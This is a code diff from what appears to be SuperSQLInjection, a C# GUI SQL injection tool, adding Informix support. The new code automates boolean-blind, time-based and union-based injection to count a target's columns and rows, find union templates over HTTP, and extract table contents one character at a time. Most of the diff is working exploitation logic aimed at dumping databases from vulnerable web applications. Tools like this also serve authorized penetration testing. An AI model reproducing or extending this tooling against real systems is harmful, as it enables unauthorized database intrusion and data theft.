+                                    columns_count = getValueByStepUp(Informix.getBoolDataBySleep(Informix.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName)), 0, 20);
+                                }
+                                else
+                                {
+                                    columns_count = getValueByStepUp(Informix.bool_columns_count.Replace("{dbname}", dbName).Replace("{table}", tableName), 0, 20);
+                                }
+                               
+                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！", LogLevel.info);
+                                for (int i = 0; i < columns_count; i++)
+                                {
+                                    SelectNode sn = new SelectNode();
+                                    sn.tn = ctn;
+                                    sn.limit = i;
+                                    sn.tableName = tableName;
+                                    sn.dbname = dbName;
+                                    this.data_tvw_dbs.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), ctn, "", "column");
+                                    stp.QueueWorkItem<SelectNode>(getColumnNameByBoolByInformix, sn);
+                                }
+                                stp.WaitForIdle();
+                                break;
                         }
 
                     }
@@ -4381,6 +4850,24 @@ namespace SuperSQLInjection
                                 csn.tn = ctn;
                                 csn.tableName = tableName;
                                 stp.QueueWorkItem<SelectNode>(getColumnNameByUnionBySQLite, csn);
+                                break;
+
+                            case DBType.Informix:
+                                columns_count_payload = Informix.getUnionDataValue(config.unionFillTemplate, Informix.columns_count, dbName, tableName, "", Informix.no_cast_value);
+                                result = getOneDataByUnionOrErrorByInformix(columns_count_payload);
+
+                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
+                                columns_count = Tools.convertToInt(result);
+                                for (int i = 0; i < columns_count; i++)
+                                {
+                                    SelectNode sn = new SelectNode();
+                                    sn.tn = ctn;
+                                    sn.limit = i;
+                                    sn.tableName = tableName;
+                                    sn.dbname = dbName;
+                                    stp.QueueWorkItem<SelectNode>(getColumnNameByUnionByInformix, sn);
+                                }
+                                stp.WaitForIdle();
                                 break;
                         }
 
@@ -5140,6 +5627,66 @@ namespace SuperSQLInjection
         }
 
         /// <summary>
+        /// 获取数据
+        /// </summary>
+        /// <param name="pams">列名集合List及limit等参数</param>
+        public void getDataValueByBoolByInformix(Object opam)
+        {
+            try
+            {
+
+                GetDataPam gp = (GetDataPam)opam;
+
+                ListViewItem lvi = null;
+
+                foreach (String columnName in gp.columns)
+                {
+                    //取每一列的值
+                    String data_payload = Informix.getBoolDataPayLoad(columnName, gp.dbname, gp.table, gp.limit);
+                    String payload_len = Informix.bool_length.Replace("{data}", data_payload).Replace("{column}", columnName);
+
+                    if (config.keyType.Equals(KeyType.Time))
+                    {
+                        payload_len = Informix.getBoolDataBySleep(Informix.bool_length.Replace("{data}", data_payload));
+                    }
+                    int len = getValueByStepUp(payload_len, 0, 50);
+                    StringBuilder result = new StringBuilder();
+                    //获取值
+                    for (int i = 1; i <= len; i++)
+                    {
+                        //获取多字节
+                        String substr_payload = Informix.bool_value.Replace("{data}", data_payload).Replace("{index}", i.ToString());
+                        if (config.keyType.Equals(KeyType.Time))
+                        {
+                            substr_payload = Informix.getBoolDataBySleep(substr_payload);
+                        }
+                        
+                        //单个ascii值范围是数字或者大写字母，范围在0-127
+                        int ascii = getValue(substr_payload, 0, 127);
+                        result.Append((char)ascii);
+                    }
+                    if (lvi == null)
+                    {
+                        lvi = new ListViewItem(result.ToString());
+                    }
+                    else
+                    {
+                        lvi.SubItems.Add(result.ToString());
+                    }
+
+                }
+                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
+                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit+1) + "行的值！", LogLevel.info);
+
+            }
+            catch (Exception e)
+            {
+                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
+        /// <summary>
         /// 获取数据，union方式
         /// </summary>
         /// <param name="pams">列名集合List及limit等参数</param>
@@ -5281,6 +5828,28 @@ namespace SuperSQLInjection
         /// 获取数据，union方式
         /// </summary>
         /// <param name="pams">列名集合List及limit等参数</param>
+        public void getDataValueByUnionByInformix(Object opam)
+        {
+            try
+            {
+                GetDataPam gp = (GetDataPam)opam;
+                ListViewItem lvi = new ListViewItem();
+                String result = getOneDataByUnionOrErrorByInformix(Informix.getUnionDataValue(config.unionFillTemplate, gp.columns, gp.dbname, gp.table, gp.limit.ToString()));
+                this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumnsInformix), result);
+                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit+1) + "行的值！", LogLevel.info);
+            }
+            catch (Exception e)
+            {
+
+                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
+            }
+            Interlocked.Increment(ref this.currentDataCount);
+        }
+
+        /// <summary>
+        /// 获取数据，union方式
+        /// </summary>
+        /// <param name="pams">列名集合List及limit等参数</param>
         public void getDataValueByUnionByPostgreSQL(Object opam)
         {
             try
@@ -5289,7 +5858,7 @@ namespace SuperSQLInjection
                 ListViewItem lvi = new ListViewItem();
                 String result = getOneDataByUnionOrError(PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, gp.columns, gp.dbname, gp.table, gp.limit.ToString()));
                 this.Invoke(new addItemToListViewByColumnsDelegate(addItemToListViewByColumns), result);
-                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);
+                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit+1) + "行的值！", LogLevel.info);
             }
             catch (Exception e)
             {
@@ -5692,6 +6261,37 @@ namespace SuperSQLInjection
                     }
 
                     break;
+                case DBType.Informix:
+                    if (config.keyType.Equals(KeyType.Time))
+                    {
+                        isMax = findKeyInBody(Informix.getBoolCountBySleep(Informix.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table)), (start + dataCount));
+                    }
+                    else {
+                        isMax = findKeyInBody(Informix.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), start + dataCount);
+                    }
+                   
+                    if (isMax)
+                    {
+                        for (int i = 0; i < dataCount; i++)
+                        {
+                            GetDataPam gd = new GetDataPam();
+                            gd.columns = columns;
+                            gd.dbname = this.curren_db;
+                            gd.table = this.curren_table;
+                            gd.limit = start + i;
+                            gd.isMuStr = config.isMuStr;
+                            stp.WaitFor(100);
+                            stp.QueueWorkItem<GetDataPam>(getDataValueByBoolByInformix, gd);
+                        }
+                        stp.WaitForIdle();
+                    }
+                    else
+                    {
+
+                        MessageBox.Show("没有这么多行数据，请改小点！");
+                    }
+
+                    break;
             }
 
         }
@@ -6041,6 +6641,34 @@ namespace SuperSQLInjection
                     }
                     stp.WaitForIdle();
                     break;
+                case DBType.Informix:
+                    datas_count_payload = Informix.getUnionDataValue(config.unionFillTemplate, Informix.data_count, this.curren_db, this.curren_table, "", Informix.no_cast_value);
+                    result = getOneDataByUnionOrErrorByInformix(datas_count_payload);
+
+                    this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);
+
+                    this.dataCount = Tools.convertToInt(result);
+
+                    if (this.dataCount < (dataCount + start))
+                    {
+                        this.txt_log.Invoke(new showLogDelegate(log), "大侠，表" + this.curren_table + "只有" + Tools.convertToInt(result) + "行数据，你需要获取的数据没有这么多呀！", LogLevel.waring);
+                        this.data_dbs_txt_count.Text = this.dataCount.ToString();
+                        break;
+                    }
+                    //下标从1开始
+                    for (int i = 0; i < dataCount; i++)
+                    {
+                        GetDataPam gd = new GetDataPam();
+                        gd.columns = columns;
+                        gd.dbname = this.curren_db;
+                        gd.table = this.curren_table;
+                        gd.limit = start + i;
+                        gd.isMuStr = config.isMuStr;
+                        stp.WaitFor(100);
+                        stp.QueueWorkItem<GetDataPam>(getDataValueByUnionByInformix, gd);
+                    }
+                    stp.WaitForIdle();
+                    break;
             }
 
         }
@@ -6227,7 +6855,7 @@ namespace SuperSQLInjection
                         foreach (String pal in list)
                         {
                             this.txt_log.Invoke(new showLogDelegate(log), "正在测试PayLoad:" + pal, LogLevel.info);
-                            String[] pals = pal.Split(':');
+                            String[] pals = pal.Split(DBVers_Splite_Str);
 
                             ServerInfo falseServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, pals[1], payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                             decimal pfalse = Tools.getLike(oserver.body, falseServer.body);
@@ -6405,7 +7033,7 @@ namespace SuperSQLInjection
                             foreach (String cpal in error_list)
                             {
 
-                                String[] pals = cpal.Split(':');
+                                String[] pals = cpal.Split(DBVers_Splite_Str);
                                 //如果已经识别出了数据库类型，根据对应的数据库类型加载错误显示payload
                                 if (!config.dbType.ToString().Equals(pals[3]) && !config.dbType.Equals(DBType.UnKnow))
                                 {
@@ -6503,6 +7131,7 @@ namespace SuperSQLInjection
                         }
                         String rand = Tools.RandNum(5);
                         String charRand = Tools.strToChr(rand, "UTF-8", "||");
+                        String informixCharRand = Tools.informixStrToChr(rand);
 
                         String unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTest(i, rand + ""));
 
@@ -6518,7 +7147,7 @@ namespace SuperSQLInjection
                         }
 
 
-                        if (DBType.Oracle.ToString().Equals(currentDB) || DBType.PostgreSQL.ToString().Equals(currentDB) || DBType.DB2.ToString().Equals(currentDB))
+                        if (DBType.Oracle.ToString().Equals(currentDB) || DBType.PostgreSQL.ToString().Equals(currentDB) || DBType.DB2.ToString().Equals(currentDB)|| DBType.Informix.ToString().Equals(currentDB))
                         {
                             for (int j = 1; j <= i; j++)
                             {
@@ -6533,6 +7162,31 @@ namespace SuperSQLInjection
                                     foreach (String tp in tp_list)
                                     {
                                         unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByDB2(tp, charRand));
+                                        ServerInfo cunionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
+                                        if (cunionServer.code == 200 && cunionServer.body.IndexOf(rand) != -1)
+                                        {
+                                            isFind = true;
+                                            newParam = strparam.Replace(param, param + "<Encode>" + payload.Replace("{payload}", setInjectStr) + "</Encode>");
+                                            unionInject = true;
+                                            selectInjectType(InjectType.Union);
+                                            this.txt_inject_unionTemplate.Text = tp;
+                                            break;
+                                        }
+                                    }
+
+                                }
+
+                                else if(DBType.Informix.ToString().Equals(currentDB))
+                                {
+                                    if (isFind)
+                                    {
+                                        break;
+                                    }
+                                    //获得所有组合情况
+                                    List<String> tp_list = Tools.getInformixUnionTemplates(i, j);
+                                    foreach (String tp in tp_list)
+                                    {
+                                        unionPayload = payload.Replace("{payload}", Comm.unionColumnCountTestByInformix(tp, informixCharRand));
                                         ServerInfo cunionServer = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, unionPayload, payload_request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                                         if (cunionServer.code == 200 && cunionServer.body.IndexOf(rand) != -1)
                                         {
@@ -6829,8 +7483,8 @@ namespace SuperSQLInjection
 
             loadVersToListView(config.dbType);
 
-            //DB2填充模板显示是否运行设置
-            if (DBType.DB2.Equals(config.dbType))
+            //DB2/Informix填充模板显示是否运行设置
+            if (DBType.DB2.Equals(config.dbType)|| DBType.Informix.Equals(config.dbType))
             {
                 this.txt_inject_unionTemplate.Enabled = true;
                 this.txt_inject_unionColumnsCount.Enabled = false;
@@ -6841,6 +7495,14 @@ namespace SuperSQLInjection
                 this.txt_inject_unionTemplate.Enabled = false;
                 this.txt_inject_unionColumnsCount.Enabled = true;
                 this.txt_inject_showIndex.Enabled = true;
+            }
+
+            ////Informix判断时间默认固定为5秒。
+            if (DBType.Informix.Equals(config.dbType))
+            {
+                this.txt_inject_key.Text = "5";
+                config.maxTime = 5;
+                this.txt_log.Invoke(new showLogDelegate(log), "Informix延时注入，无法设置延时时间，内置延时语句一般都会执行5秒以上，所以默认设置5秒时间，如果正常响应接近5秒，可以观察日志响应时间，并稍微调大一些！", LogLevel.info);
             }
 
         }
@@ -6866,7 +7528,7 @@ namespace SuperSQLInjection
             {
                 foreach (String ver in vers)
                 {
-                    String[] cvers = ver.Split(':');
+                    String[] cvers = ver.Split(DBVers_Splite_Str);
                     ListViewItem lvi = new ListViewItem(cvers[0]);
                     lvi.Tag = cvers[1];
                     this.data_lvw_ver.Items.Add(lvi);
